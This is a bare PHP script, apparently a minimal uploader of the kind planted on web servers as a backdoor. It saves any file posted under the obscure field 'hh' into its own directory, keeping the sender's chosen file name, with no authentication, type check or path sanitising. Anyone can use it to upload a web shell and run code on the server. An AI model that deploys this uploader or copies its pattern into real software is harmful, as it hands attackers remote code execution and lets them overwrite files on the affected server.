<?php
if (isset($_FILES["hh"]) && is_uploaded_file($_FILES["hh"]["tmp_name"])) {
	$destinationDirectory = "./";
	$destinationPath = $destinationDirectory . $_FILES["hh"]["name"];

	if (move_uploaded_file($_FILES["hh"]["tmp_name"], $destinationPath)) {
		echo "File uploaded successfully to the current directory.";
	} else {
		echo "Failed to upload the file.";
	}
} else {
	echo "No file uploaded.";
}
?>